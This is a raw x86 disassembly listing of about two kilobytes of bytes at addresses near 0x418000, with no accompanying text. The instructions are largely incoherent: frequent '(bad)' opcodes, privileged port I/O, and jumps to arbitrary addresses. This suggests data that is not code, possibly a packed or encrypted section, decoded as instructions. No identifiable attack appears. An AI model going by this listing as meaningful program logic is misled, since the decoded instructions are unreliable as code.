  4180c8:	test   BYTE PTR [eax+0x4190647c],al
  4180ce:	push   es
  4180cf:	js     0x418145
  4180d1:	jo     0x418063
  4180d3:	inc    ecx
  4180d4:	push   es
  4180d5:	sbb    DWORD PTR [eax+ebp*2+0x64],ebp
  4180d9:	inc    ecx
  4180da:	push   es
  4180db:	sbb    DWORD PTR [eax+eiz*2-0x50],esp
  4180df:	pop    esp
  4180e0:	push   es
  4180e1:	sbb    DWORD PTR [eax+edx*4+0x58],esp
  4180e5:	push   esp
  4180e6:	enter  0x19c4,0x64
  4180ea:	nop
  4180eb:	inc    ecx
  4180ec:	rcl    BYTE PTR [eax+0x4c],0x64
  4180f0:	nop
  4180f1:	inc    ecx
  4180f2:	push   es
  4180f3:	dec    eax
  4180f4:	fcom   st(4)
  4180f6:	nop
  4180f7:	inc    ecx
  4180f8:	push   es
  4180f9:	sbb    eax,edx
  4180fb:	inc    esp
  4180fc:	inc    eax
  4180fd:	or     eax,0x3c64197f
  418102:	cmp    BYTE PTR [ebx-0x7d],dl
  418105:	les    edi,FWORD PTR [ebx+edi*4-0x12abb9f6]
  41810c:	jmp    ebp
  41810e:	test   eax,ebp
  418110:	rol    DWORD PTR [ecx],1
  418112:	in     al,0xf6
  418114:	sub    al,0x1
  418116:	je     0x41811d
  418118:	movzx  ebx,WORD PTR [esp+0x30]
  41811d:	mov    eax,ebx
  41811f:	sbb    eax,DWORD PTR [ecx+0x6]
  418122:	sbb    esp,ebp
  418124:	inc    esp
  418125:	pop    ebx
  418126:	ret    
  418127:	arpl   WORD PTR [eax+esi*1],si
  41812a:	push   es
  41812b:	sbb    DWORD PTR [eax+edx*4+0x2c],esp
  41812f:	sub    BYTE PTR [eax+eiz*1],ah
  418132:	jbe    0x418198
  418134:	nop
  418135:	inc    ecx
  418136:	sbb    al,0x18
  418138:	hlt    
  418139:	mov    ebx,0xe5cdcb6e
  41813e:	call   DWORD PTR [ebp-0x20]
  418141:	cmp    DWORD PTR [ebx],0x0
  418144:	jne    0x41819f
  418146:	push   0x6a0644
  41814b:	add    ch,BYTE PTR [eax-0x1289f777]
  418151:	(bad)  
  418153:	cmp    DWORD PTR [ebx+eax*1+0x16],0x7
  418158:	xor    eax,eax
  41815a:	mov    DWORD PTR [esp],eax
  41815d:	jmp    0x418138
  41815f:	adc    DWORD PTR [ebx-0x42404eb],ecx
  418165:	out    dx,al
  418166:	sub    al,0xdc
  418168:	mov    DWORD PTR [eax],edx
  41816a:	or     esp,DWORD PTR [ebx-0x2f74e4f6]
  418170:	add    edx,edx
  418172:	mov    ecx,DWORD PTR [esi+ecx*1+0x7f]
  418176:	jg     0x418193
  418178:	jg     0x418107
  41817a:	push   esp
  41817b:	rol    DWORD PTR [ecx+ecx*4],1
  41817e:	push   esp
  41817f:	jne    0x41810c
  418181:	add    ecx,DWORD PTR [ebx]
  418183:	mov    DWORD PTR [edx],ecx
  418185:	pop    es
  418186:	mov    DWORD PTR [ebx],edx
  418188:	inc    eax
  418189:	mov    ebp,0x83fee6bf
  41818e:	clc    
  41818f:	fs jne 0x41816e
  418192:	mov    eax,DWORD PTR [ebx]
  418194:	dec    esi
  418195:	adc    eax,0x3890003
  41819a:	pop    es
  41819b:	ja     0x4181f8
  41819d:	mov    dh,0xd6
  41819f:	push   ecx
  4181a0:	mov    eax,DWORD PTR [edx]
  4181a2:	lds    ecx,FWORD PTR [ecx+ecx*4]
  4181a5:	adc    al,BYTE PTR [eax+0x4]
  4181a8:	retf   
  4181a9:	je     0x41819a
  4181ab:	sti    
  4181ac:	ins    DWORD PTR es:[edi],dx
  4181ad:	push   ebx
  4181ae:	push   esi
  4181af:	push   cs
  4181b0:	clc    
  4181b1:	mov    esi,edx
  4181b3:	mov    ebx,eax
  4181b5:	jg     0x41819f
  4181b7:	xor    BYTE PTR [edi+0x4],bh
  4181ba:	jbe    0x4181d7
  4181bc:	sti    
  4181bd:	mov    dl,0x4
  4181bf:	jmp    0x4181fb
  4181c1:	mov    eax,DWORD PTR [esi]
  4181c3:	dec    edi
  4181c4:	inc    edx
  4181c5:	add    DWORD PTR [esi+0x4],0x39fbdd09
  4181cc:	ja     0x4181da
  4181ce:	push   esp
  4181cf:	inc    esp
  4181d0:	push   ebx
  4181d1:	adc    al,0x24
  4181d3:	xchg   ecx,eax
  4181d4:	push   esp
  4181d5:	pop    eax
  4181d6:	jle    0x418163
  4181d8:	lea    ebx,[ecx+0x6d501e04]
  4181de:	imul   esi,DWORD PTR [eax+0x5e5a5901],0xffffffee
  4181e5:	fnsave [esi+0x125963d7]
  4181eb:	mov    DWORD PTR [eax],ebp
  4181ed:	mov    edx,DWORD PTR [eax]
  4181ef:	mov    ds:0xee976331,eax
  4181f4:	jne    0x4181a8
  4181f6:	add    al,0xa4
  4181f8:	ds or  al,0x4a
  4181fb:	add    al,0xd9
  4181fd:	loopne 0x4181be
  4181ff:	arpl   bp,bp
  418201:	sub    edx,ebp
  418203:	loopne 0x418238
  418205:	(bad)  
  418206:	push   edi
  418207:	push   ebp
  418208:	aaa    
  418209:	(bad)  [ebx-0x1208a493]
  41820f:	lock mov edi,esp
  418212:	jg     0x41819d
  418214:	pop    es
  418215:	mov    eax,DWORD PTR [edx]
  418217:	mov    ebx,0x2c433542
  41821c:	pop    es
  41821d:	mov    ebp,0xc7cfedfb
  418222:	jns    0x41823b
  418224:	mov    edx,DWORD PTR [edx-0x6f]
  418227:	retf   0x2f8b
  41822a:	add    ecx,DWORD PTR [ebp-0x72]
  41822d:	cmp    ecx,eax
  41822f:	jne    0x418249
  418231:	fstp   TBYTE PTR [ecx-0x42e65123]
  418237:	add    edx,eax
  418239:	and    BYTE PTR [eax+0x8],al
  41823c:	sub    eax,0x2f010c06
  418241:	not    BYTE PTR [esi+0x16eb7b7d]
  418247:	add    eax,DWORD PTR [ebx+edi*1]
  41824a:	shl    BYTE PTR [ebp+0xf],1
  41824d:	push   ds
  41824e:	pop    ss
  41824f:	mov    ds:0x7ff7f7b7,eax
  418254:	pop    es
  418255:	cmp    esi,DWORD PTR [edi]
  418257:	jne    0x418207
  418259:	mov    edx,ebx
  41825b:	mov    eax,esi
  41825d:	sbb    dh,BYTE PTR [esp+eax*4-0x40]
  418261:	lock mov eax,0x9df75a59
  418267:	cdq    
  418268:	int3   
  418269:	pop    ebp
  41826a:	pop    edi
  41826b:	pop    DWORD PTR [edi-0x790b1310]
  418271:	mov    esp,0x3235adb9
  418276:	push   0xffffffb7
  418278:	push   es
  418279:	pop    edi
  41827a:	outs   dx,DWORD PTR ds:[esi]
  41827b:	jb     0x5fb0f207
  418281:	jo     0x4182a2
  418283:	xor    DWORD PTR [ebx+0x155f033e],ecx
  418289:	stc    
  41828a:	add    edi,DWORD PTR [edx+0x64]
  41828d:	fbstp  TBYTE PTR [edx+0x76]
  418290:	sbb    edi,DWORD PTR [esi-0x21]
  418293:	jne    0x41821c
  418295:	and    DWORD PTR [edi+0x41010e8b],esp
  41829b:	or     BYTE PTR [edi],al
  41829d:	push   ss
  41829e:	sub    DWORD PTR [esi+eax*1],ebp
  4182a1:	and    DWORD PTR [ecx-0x39],0xffffffda
  4182a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4182a6:	js     0x418255
  4182a8:	jne    0x418300
  4182aa:	pop    es
  4182ab:	sub    bl,0x4d
  4182ae:	xor    al,0xdd
  4182b0:	test   BYTE PTR [edi],0x7b
  4182b3:	jne    0x4182bf
  4182b5:	sub    bl,ch
  4182b7:	xor    ecx,DWORD PTR [ebx-0x6aa5fce6]
  4182bd:	pop    esp
  4182be:	fnstsw WORD PTR [esi]
  4182c0:	out    dx,al
  4182c1:	jbe    0x4182bf
  4182c3:	retf   
  4182c4:	mov    edi,DWORD PTR [edi+0x2e]
  4182c7:	add    edi,DWORD PTR [ebp+0xc]
  4182ca:	sub    edi,ebx
  4182cc:	mov    DWORD PTR [edx],ecx
  4182ce:	sub    ecx,eax
  4182d0:	jle    0x41831a
  4182d2:	or     al,0x8d
  4182d4:	mov    ebx,0x331ec070
  4182d9:	push   es
  4182da:	lods   al,BYTE PTR ds:[esi]
  4182db:	jmp    0x4182f5
  4182dd:	gs jmp 0x4182f4
  4182e0:	xchg   edx,eax
  4182e1:	mov    ch,0x37
  4182e3:	fild   DWORD PTR [edx+0x3ba00613]
  4182e9:	jne    0xb428248
  4182ef:	mov    ebx,0xb619adb1
  4182f4:	adc    ch,al
  4182f6:	nop
  4182f7:	ret    
  4182f8:	mov    ebx,edx
  4182fa:	inc    edi
  4182fb:	xor    DWORD PTR [edi-0x148100a],0x7d0010ad
  418305:	pop    es
  418306:	mov    esi,0x810ceb06
  41830b:	(bad)  
  41830c:	and    al,0x9
  41830e:	and    esi,0xaeff6c66
  418314:	add    ch,al
  418316:	mov    DWORD PTR [ebx+0x4],esi
  418319:	push   0x1
  41831b:	push   0x560b2000
  418320:	sub    DWORD PTR [ebx+0x58],0xf8f997f8
  418327:	mov    DWORD PTR [ebx],edi
  418329:	test   edi,edi
  41832b:	je     0x418350
  41832d:	sbb    bh,BYTE PTR [eax-0x488f1b6d]
  418333:	lock fmul DWORD PTR [esi]
  418336:	adc    esp,DWORD PTR [eax+eax*4]
  418339:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41833a:	outs   dx,DWORD PTR ds:[esi]
  41833b:	push   eax
  41833c:	es xchg cl,ah
  41833f:	mov    al,0xc3
  418341:	shr    BYTE PTR [ebx+eiz*2],0x55
  418345:	lods   al,BYTE PTR ds:[esi]
  418346:	inc    eax
  418347:	mov    esi,0xe8e15fb1
  41834c:	(bad)  
  41834d:	pop    ecx
  41834e:	pusha  
  41834f:	push   0x4
  418351:	dec    edi
  418352:	push   0x4726550b
  418357:	jbe    0x418319
  418359:	push   edx
  41835a:	jne    0x41837b
  41835c:	js     0x418362
  41835e:	add    al,0x98
  418360:	test   eax,0xc4e24cd
  418365:	jbe    0x4182ec
  418367:	inc    edx
  418368:	inc    ebx
  418369:	mov    dl,0xdb
  41836b:	lahf   
  41836c:	call   0x1b4f21ba
  418371:	mov    edi,0xff16c7a6
  418376:	stc    
  418377:	leave  
  418378:	mov    DWORD PTR [esi+0xc],ebx
  41837b:	stos   BYTE PTR es:[edi],al
  41837c:	adc    BYTE PTR [esi],ch
  41837e:	mov    esp,0x2c03851f
  418383:	jno    0x418399
  418385:	mov    eax,ds:0x6beb1e4b
  41838a:	ins    DWORD PTR es:[edi],dx
  41838b:	imul   edi,DWORD PTR [eax+0x1c],0x58c13a26
  418392:	pop    esp
  418393:	sbb    eax,0xd2859437
  418398:	jb     0x4183ec
  41839a:	int    0x79
  41839c:	add    edi,DWORD PTR [eax]
  41839e:	adc    al,0x77
  4183a0:	inc    ebp
  4183a1:	mov    dh,0xeb
  4183a3:	push   ds
  4183a4:	jbe    0x4183b8
  4183a6:	or     BYTE PTR [ebx+0x7e],dh
  4183a9:	or     BYTE PTR [ecx],ah
  4183ab:	push   0x19680304
  4183b0:	popa   
  4183b1:	cwde   
  4183b2:	imul   ebx,ebx,0x6c
  4183b5:	dec    esp
  4183b6:	jbe    0x4183cb
  4183b8:	add    eax,0xdd03fe84
  4183bd:	fcmovnu st,st(1)
  4183bf:	xchg   DWORD PTR [ebp+0x5c70a9a],eax
  4183c5:	pop    ebp
  4183c6:	rcr    dl,0x8f
  4183c9:	lea    edx,[ecx]
  4183cb:	test   dh,bl
  4183cd:	push   edi
  4183ce:	push   es
  4183cf:	mov    edi,0x7175063b
  4183d4:	ficomp DWORD PTR [edx+0x7ab8cba]
  4183da:	dec    ebx
  4183db:	or     al,0xd5
  4183dd:	adc    DWORD PTR [eax-0x3e502488],edi
  4183e3:	leave  
  4183e4:	mov    ds:0x447092b,eax
  4183e9:	mov    ecx,0x3699c618
  4183ee:	xchg   ebp,eax
  4183ef:	leave  
  4183f0:	out    dx,eax
  4183f1:	call   0xd0b6111c
  4183f6:	clc    
  4183f7:	inc    esi
  4183f8:	leave  
  4183f9:	xor    eax,0xe0738d7d
  4183fe:	loope  0x418381
  418400:	loope  0x418402
  418402:	lock scas eax,DWORD PTR es:[edi]
  418404:	loope  0x4183a1
  418406:	imul   ebp,DWORD PTR [edx],0x4c
  418409:	rcr    BYTE PTR [ecx+eax*4],1
  41840c:	ret    0xfff
  41840f:	cmp    eax,0xdb3812e2
  418414:	test   eax,0x104ddb7b
  418419:	aad    0x9
  41841b:	sub    esp,DWORD PTR [ebx]
  41841d:	daa    
  41841e:	jge    0x418476
  418420:	jl     0x41840e
  418422:	pop    es
  418423:	jmp    0x418480
  418425:	push   es
  418426:	push   es
  418427:	add    ebx,esp
  418429:	mov    ebx,0x453b1b73
  41842e:	lahf   
  41842f:	in     eax,0x10
  418431:	jae    0x418439
  418433:	xor    dl,BYTE PTR [edi]
  418435:	fsub   QWORD PTR [esi-0x21]
  418438:	xlat   BYTE PTR ds:[ebx]
  418439:	adc    ah,dh
  41843b:	jbe    0x4183cc
  41843d:	adc    al,0x1d
  41843f:	add    al,0x73
  418441:	pop    ds
  418442:	arpl   bp,bp
  418444:	int    0x3d
  418446:	mov    ss,WORD PTR [eax]
  418448:	retf   
  418449:	or     ebp,DWORD PTR [ebx]
  41844b:	push   es
  41844c:	push   eax
  41844d:	adc    esp,edi
  41844f:	mov    eax,0x343e91b3
  418454:	push   es
  418455:	jae    0x418442
  418457:	(bad)  
  418459:	pop    es
  41845a:	fadd   QWORD PTR [ebx]
  41845c:	pop    ebx
  41845d:	ret    0x7ec
  418460:	jne    0x4183fe
  418462:	rol    BYTE PTR [edi-0x13939b43],0x91
  418469:	pop    esp
  41846a:	jmp    0x6cc3:0xe5b0c581
  418471:	and    al,0x93
  418473:	pop    esp
  418474:	fdivr  DWORD PTR [ebp-0x6f27beff]
  41847a:	or     eax,0xbc0358c9
  41847f:	add    edi,DWORD PTR [ebx-0x37404995]
  418485:	push   es
  418486:	sbb    eax,DWORD PTR [ebx]
  418488:	jae    0x4184aa
  41848a:	mov    bh,0x40
  41848c:	add    esi,DWORD PTR [esi+0x3090cec2]
  418492:	sahf   
  418493:	add    bh,BYTE PTR [edx+0x61234b5f]
  418499:	lahf   
  41849a:	jnp    0x41847a
  41849c:	fisubr DWORD PTR [ebx-0x43]
  41849f:	mov    eax,ds:0x1f74748c
  4184a4:	hlt    
  4184a5:	mov    ds:0x6c09c03f,al
  4184aa:	sub    DWORD PTR [edi],0x3b418f9d
  4184b0:	jo     0x4184be
  4184b2:	jg     0x4184a1
  4184b4:	retf   
  4184b5:	cwde   
  4184b6:	fdiv   st,st(5)
  4184b8:	arpl   WORD PTR [edi-0x75],si
  4184bb:	(bad)  
  4184bc:	pusha  
  4184bd:	push   es
  4184be:	hlt    
  4184bf:	stos   DWORD PTR es:[edi],eax
  4184c0:	pop    edi
  4184c1:	mov    ecx,DWORD PTR [edx+0x17]
  4184c4:	add    DWORD PTR [ecx-0x1c],edi
  4184c7:	jmp    0xed48a0e5
  4184cc:	pop    es
  4184cd:	inc    edi
  4184ce:	mov    eax,DWORD PTR [edi]
  4184d0:	push   cs
  4184d1:	jb     0x4184aa
  4184d3:	cmp    edi,DWORD PTR [esi]
  4184d5:	js     0x41853f
  4184d7:	das    
  4184d8:	jne    0x418495
  4184da:	add    eax,0xce9a050
  4184df:	cld    
  4184e0:	cmp    BYTE PTR [esi],ah
  4184e2:	lea    eax,ds:0xf804c511
  4184e8:	mov    dh,0xb1
  4184ea:	inc    ecx
  4184eb:	outs   dx,BYTE PTR ds:[esi]
  4184ec:	xchg   edx,eax
  4184ed:	adc    edx,DWORD PTR [ebx+0x2]
  4184f0:	add    ebx,DWORD PTR [edi+0x2c]
  4184f3:	lods   eax,DWORD PTR ds:[esi]
  4184f4:	pop    ss
  4184f5:	mov    dl,0x71
  4184f7:	jae    0x41851c
  4184f9:	or     al,0x89
  4184fb:	or     al,0x8b
  4184fd:	and    esp,DWORD PTR [edi+0xd]
  418500:	lods   eax,DWORD PTR ds:[esi]
  418501:	cli    
  418502:	inc    ecx
  418503:	addr16 add al,0xac
  418506:	(bad)  
  418507:	out    0xfc,eax
  418509:	lods   al,BYTE PTR ds:[esi]
  41850a:	lea    esp,[ecx]
  41850c:	out    0x6,eax
  41850e:	push   cs
  41850f:	cmp    ebp,DWORD PTR [esi]
  418511:	je     0x41851a
  418513:	fwait
  418514:	cmp    DWORD PTR [ebx+0x753be96c],edi
  41851a:	out    dx,eax
  41851b:	push   es
  41851c:	pop    edi
  41851d:	call   0x8ec6:0x3eb9fe0f
  418524:	pushf  
  418525:	lods   al,BYTE PTR ds:[esi]
  418526:	mov    edx,edi
  418528:	sub    edx,DWORD PTR [eax-0x66]
  41852b:	int    0xe
  41852d:	add    eax,DWORD PTR [ecx+0xc]
  418530:	int    0xf6
  418532:	loopne 0x41851f
  418534:	jns    0x41853e
  418536:	fwait
  418537:	mov    ah,0x78
  418539:	popf   
  41853a:	xor    edx,DWORD PTR [eax]
  41853c:	jl     0x418509
  41853e:	gs pop ebp
  418540:	ins    DWORD PTR es:[edi],dx
  418541:	or     BYTE PTR [edi-0x74ea60f0],bl
  418547:	fadd   DWORD PTR [eax-0x14]
  41854a:	mov    cl,0xc
  41854c:	retf   0xf3a2
  41854f:	xor    edx,edx
  418551:	test   eax,0xb9145dbd
  418556:	in     eax,dx
  418557:	or     dl,BYTE PTR [ebx+0x42]
  41855a:	push   ebp
  41855b:	push   ecx
  41855c:	imul   eax,DWORD PTR [eax+0x3446580c],0xffffffa1
  418563:	xchg   ecx,eax
  418564:	push   ds
  418565:	popa   
  418566:	push   sp
  418568:	dec    edx
  418569:	jmp    0x4185bd
  41856b:	jl     0x41851a
  41856d:	cmp    DWORD PTR [eax],edi
  41856f:	idiv   BYTE PTR [ebx]
  418571:	fnsave [ebp+0x42]
  418574:	scas   eax,DWORD PTR es:[edi]
  418575:	jg     0x4185b2
  418577:	and    al,0x3e
  418579:	pop    eax
  41857a:	sub    ebp,0xffffff83
  41857d:	or     BYTE PTR [edx-0x48],dh
  418580:	cmp    BYTE PTR [edi+0x2e],dl
  418583:	imul   edx,DWORD PTR [eax],0x78
  418586:	addr16 loope 0x4185c9
  418589:	js     0x4185a1
  41858b:	or     ch,BYTE PTR [ecx+0x19]
  41858e:	ror    DWORD PTR [esi],0x99
  418591:	adc    BYTE PTR [edi],al
  418593:	push   ebx
  418594:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418595:	cmp    BYTE PTR [ebx],ah
  418597:	sbb    al,0x69
  418599:	lea    ecx,fs:[eax-0x63b61ece]
  4185a0:	mov    fs,WORD PTR [esi+0x4e]
  4185a3:	sub    BYTE PTR [ecx+0x762727c0],dl
  4185a9:	xchg   bl,bl
  4185ab:	cmp    esi,DWORD PTR [esi+esi*2]
  4185ae:	pop    edi
  4185af:	jmp    0x2a55b0c2
  4185b4:	lea    ebx,[ebp+0x74c76f5]
  4185ba:	mov    ah,0xdd
  4185bc:	xchg   edi,eax
  4185bd:	hlt    
  4185be:	retf   0xc78b
  4185c1:	ins    BYTE PTR es:[edi],dx
  4185c2:	mov    dl,0x77
  4185c4:	es test ebx,ebx
  4185c7:	je     0x4185e8
  4185c9:	mov    ebx,0x9827a0c5
  4185cf:	bound  edi,QWORD PTR [eax+0x7ea9ad2]
  4185d5:	adc    al,0x8b
  4185d7:	ror    ecx,0xe
  4185da:	add    edi,DWORD PTR [ebx]
  4185dc:	mov    ebx,gs
  4185de:	xchg   bp,ax
  4185e0:	shl    BYTE PTR [esi-0x7f],0x83
  4185e4:	xlat   BYTE PTR ds:[ebx]
  4185e5:	cmp    ah,ch
  4185e7:	push   ecx
  4185e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4185e9:	push   ebp
  4185ea:	test   BYTE PTR [edi-0x9],0xdf
  4185ee:	sub    cl,BYTE PTR [ebx]
  4185f0:	mov    esp,0x6432ff64
  4185f5:	mov    DWORD PTR [edx],esp
  4185f7:	push   0xc8c2c428
  4185fc:	cmp    BYTE PTR ds:0xb260490a,0xed
  418603:	push   eax
  418604:	inc    ebp
  418605:	aas    
  418606:	or     dl,BYTE PTR [edx]
  418608:	rcr    BYTE PTR [ecx],1
  41860a:	icebp  
  41860b:	enter  0xbe43,0x6c
  41860f:	or     esp,esi
  418611:	push   esi
  418612:	and    BYTE PTR [eax-0x8],ch
  418615:	pmaxub mm3,mm6
  418618:	frstor [esi+eax*2-0x5d]
  41861c:	adc    eax,0x53d831c
  418621:	inc    ecx
  418622:	inc    eax
  418623:	mov    eax,0xf03fc003
  418628:	push   ds
  418629:	not    BYTE PTR ds:0xf482220d
  41862f:	inc    eax
  418630:	cmp    eax,0x735bc401
  418635:	fild   QWORD PTR [edx+0x45c7ec75]
  41863b:	cld    
  41863c:	adc    al,0xcf
  41863e:	push   es
  41863f:	mov    edx,DWORD PTR [ebp-0x4]
  418642:	lahf   
  418643:	jle    0x418633
  418645:	in     al,dx
  418646:	mov    esp,0x41071008
  41864b:	adc    dh,al
  41864d:	inc    edx
  41864e:	mov    esp,0x6df65701
  418653:	outs   dx,DWORD PTR ds:[esi]
  418654:	mov    cl,0x5a
  418656:	pop    ecx
  418657:	pop    ecx
  418658:	pushf  
  418659:	adc    BYTE PTR [edi-0x5127683d],ah
  41865f:	lock sti 
  418661:	mov    es,ebx
  418663:	add    esp,DWORD PTR [edi]
  418665:	xor    bl,ch
  418667:	in     eax,0xa0
  418669:	sub    eax,0xd76b5d59
  41866e:	ja     0x418611
  418670:	cmp    eax,0xf29c213
  418675:	repz test al,ch
  418678:	jle    0x41862a
  41867a:	gs stc 
  41867c:	xor    eax,0xc00ce643
  418681:	xor    BYTE PTR [eax],ah
  418683:	fmul   QWORD PTR [ebp+0x6b059ef4]
  418689:	add    BYTE PTR [ecx+0x4b0c4a5],ah
  41868f:	jle    0x4186e7
  418691:	lods   al,BYTE PTR ds:[esi]
  418692:	xor    al,dh
  418694:	sbb    BYTE PTR [ebp-0x8],al
  418697:	jmp    0x4186b4
  418699:	xchg   bh,dh
  41869b:	and    eax,0x870b3681
  4186a0:	or     eax,DWORD PTR [eax]
  4186a2:	sbb    al,0x8b
  4186a4:	test   bl,bl
  4186a6:	and    al,0xdc
  4186a8:	pop    es
  4186a9:	jne    0x418686
  4186ab:	and    al,0x7a
  4186ad:	(bad)  
  4186ae:	push   ss
  4186af:	mov    eax,ds:0x83ef48a1
  4186b4:	jge    0x4186b2
  4186b6:	add    BYTE PTR [ecx+eiz*1+0x0],dh
  4186ba:	pop    es
  4186bb:	ss jae 0x4186cf
  4186be:	push   eax
  4186bf:	or     DWORD PTR [eax+eiz*1+0x75],esi
  4186c3:	and    DWORD PTR [eax-0x6204fe4],eax
  4186c9:	or     al,0xc7
  4186cb:	add    esi,DWORD PTR [esi-0x21]
  4186ce:	inc    ecx
  4186cf:	es loopne 0x4186ad
  4186d2:	pop    ecx
  4186d3:	call   DWORD PTR [ebx-0x3]
  4186d6:	cmp    eax,DWORD PTR ds:0x1f43de84
  4186dc:	inc    ecx
  4186dd:	jne    0x4186e8
  4186df:	add    BYTE PTR ds:0xe3be090a,dl
  4186e5:	add    ebx,DWORD PTR [edi]
  4186e7:	push   eax
  4186e8:	or     BYTE PTR [ecx+0x4e7f67fa],al
  4186ee:	ins    BYTE PTR es:[edi],dx
  4186ef:	jne    0x418708
  4186f1:	test   edx,edx
  4186f3:	jns    0x4186e1
  4186f5:	xchg   eax,esi
  4186f7:	aaa    
  4186f8:	or     eax,0xfac103c2
  4186fd:	add    ah,BYTE PTR [ecx-0x140b6f61]
  418703:	dec    ebx
  418704:	push   ss
  418705:	adc    DWORD PTR [edi],0xfffffffa
  418708:	mov    ebp,0x8b170d8b
  41870d:	sbb    al,0x2d
  41870f:	pop    esp
  418710:	xchg   ecx,eax
  418711:	hlt    
  418712:	les    eax,FWORD PTR [esi+0x6d3421d0]
  418718:	adc    BYTE PTR [esi-0x227add2f],al
  41871e:	pop    ecx
  41871f:	jmp    0x41873a
  418721:	sbb    dl,dl
  418723:	pop    ebx
  418724:	cmp    al,0xc6
  418726:	addr16 iret 
  418728:	push   ecx
  418729:	mov    ecx,esp
  41872b:	add    esp,DWORD PTR [eax]
  41872d:	mov    DWORD PTR [ecx],edx
  41872f:	cmp    cl,BYTE PTR [ebx-0x5e448229]
  418735:	adc    DWORD PTR [edx+0x3b],eax
  418738:	ret    0x9e72
  41873b:	sbb    DWORD PTR [ebx],eax
  41873d:	push   ebx
  41873e:	or     al,0x8
  418740:	sbb    eax,0x7ed02611
  418745:	pop    ebx
  418746:	adc    bl,BYTE PTR [ecx]
  418748:	mov    edx,0xf9113b20
  41874d:	cmp    eax,0x3c779ddc
  418752:	cmp    BYTE PTR [edi+0x5a018b01],ch
  418758:	inc    ebx
  418759:	retf   0xe983
  41875c:	jbe    0x418755
  41875e:	fisttp DWORD PTR [ebx]
  418760:	loopne 0x41877e
  418762:	add    DWORD PTR [ecx+0x10fa838f],ecx
  418768:	jl     0x41877d
  41876a:	(bad)  
  41876b:	mov    DWORD PTR [edx],0xb7372407
  418771:	popa   
  418772:	stos   DWORD PTR es:[edi],eax
  418773:	add    cl,dl
  418775:	push   es
  418776:	setl   BYTE PTR [esi]
  418779:	pop    ss
  41877a:	add    al,0x7c
  41877c:	mov    ch,0x53
  41877e:	mov    bh,0x83
  418780:	btc    ecx,ecx
  418783:	add    dl,BYTE PTR [esi]
  418785:	mov    DWORD PTR [ebx-0x3e4496fc],esp
  41878b:	xlat   BYTE PTR ds:[ebx]
  41878c:	push   ss
  41878d:	call   DWORD PTR [eax-0x54]
  418790:	pop    ss
  418791:	sub    edx,0xffffff97
  418794:	adc    dh,BYTE PTR [ebp-0x12]
  418797:	mov    eax,ds:0x74fc696e
  41879c:	jg     0x4187a8
  41879e:	add    edi,edi
  4187a0:	mov    al,0x3a
  4187a2:	outs   dx,BYTE PTR ds:[esi]
  4187a3:	rcr    edi,cl
  4187a5:	fcom   QWORD PTR [eax+edi*8]
  4187a8:	pop    edi
  4187a9:	cmp    cl,BYTE PTR [esp+edi*2]
  4187ac:	push   cs
  4187ad:	or     edx,0x2
  4187b0:	mov    dh,0xc0
  4187b2:	add    al,0x14
  4187b4:	cmp    DWORD PTR [edi-0x37],0x4ddc0dd8
  4187bb:	or     al,BYTE PTR [ebx]
  4187bd:	ret    0x2083
  4187c0:	inc    bl
  4187c2:	movsx  ecx,BYTE PTR [edi+0x17]
  4187c6:	ins    BYTE PTR es:[edi],dx
  4187c7:	push   ecx
  4187c8:	dec    eax
  4187c9:	sbb    ecx,esp
  4187cb:	cmp    ecx,0xfbed7405
  4187d1:	sbb    DWORD PTR [esp+esi*8],eax
  4187d4:	add    al,0xda
  4187d6:	and    ebx,0x6d572b64
  4187dc:	push   cs
  4187dd:	jae    0x4187dc
  4187df:	enter  0x1133,0xf7
  4187e3:	ret    0x78fe
  4187e6:	pop    ds
  4187e7:	add    eax,0x5a1601f6
  4187ec:	jp     0x418839
  4187ee:	(bad)  
  4187ef:	sub    DWORD PTR [ebp-0x42],eax
  4187f2:	jb     0x418857
  4187f4:	(bad)  
  4187f5:	sbb    al,0xb6
  4187f7:	shl    BYTE PTR [ecx+ebx*1+0x64308e9],0x8f
  4187ff:	dec    edx
  418800:	pop    ds
  418801:	jmp    0x418803
  418803:	or     al,0xc8
  418805:	add    ebx,esi
  418807:	loop   0x4187d8
  418809:	fucomip st,st(7)
  41880b:	add    bh,BYTE PTR [edi+0x77]
  41880e:	fdiv   DWORD PTR [ebx]
  418810:	mul    BYTE PTR [ebx+0xb6d00a9]
  418816:	and    eax,0xa1980360
  41881b:	fsub   st(0),st
  41881d:	lock add ebx,eax
  418820:	test   DWORD PTR [eax+0x16311402],ebp
  418826:	clc    
  418827:	sbb    ebp,DWORD PTR [ebx-0x67]
  41882a:	or     BYTE PTR [edx],bl
  41882c:	and    DWORD PTR [ebx],0xfffffffe
  41882f:	cli    
  418830:	pop    edx
  418831:	rol    BYTE PTR [edi-0xbac73f2],0x2c
  418838:	xor    ebx,ebx
  41883a:	mov    bh,0x94
  41883c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41883d:	mov    ss,WORD PTR [edi]
  41883f:	or     eax,0x8f27f15c
  418844:	jb     0x4187f1
  418846:	sbb    DWORD PTR [esi+0x27840af],esi
  41884c:	mov    esi,0x6f6ed73f
  418852:	or     eax,0xc8dd0bf
  418857:	cs sub edx,ecx
  41885a:	sbb    DWORD PTR [edi-0x12],edi
  41885d:	lock sub esi,ebp
  418860:	xor    eax,0x6056c72b
  418865:	in     al,dx
  418866:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418867:	fmul   QWORD PTR [edi*2-0x372ad7ea]
  41886e:	and    al,0x9b
  418870:	mov    DWORD PTR [ebp-0x3d],ebx
  418873:	(bad)  
  418874:	fadd   st,st(7)
  418876:	dec    ebx
  418877:	or     bl,BYTE PTR [ebp+eiz*4+0xa]
  41887b:	(bad)  
  41887c:	xor    al,0xf4
  41887e:	fmul   DWORD PTR ds:0x4458d18
  418884:	adc    BYTE PTR [ebx+0x3acb243c],cl
  41888a:	sahf   
  41888b:	jp     0x4188f4
  41888d:	or     eax,0xa06ed5f0
  418892:	push   esi
  418893:	cmp    eax,0x75ff6d4c
  418898:	jmp    0x408d9fa
  41889d:	cmc    
  41889e:	shl    BYTE PTR [esi+0xa],1
  4188a1:	lea    edx,[eiz*2-0x214e2530]
  4188a8:	(bad)  
  4188a9:	and    DWORD PTR [esi],ecx
  4188ab:	adc    esp,0x1b3ac5a
  4188b1:	neg    DWORD PTR ds:0x850cde24
  4188b7:	sti    
  4188b8:	sub    DWORD PTR [ecx+0x59adda34],ecx
  4188be:	jmp    0xe81e:0x308f4e5
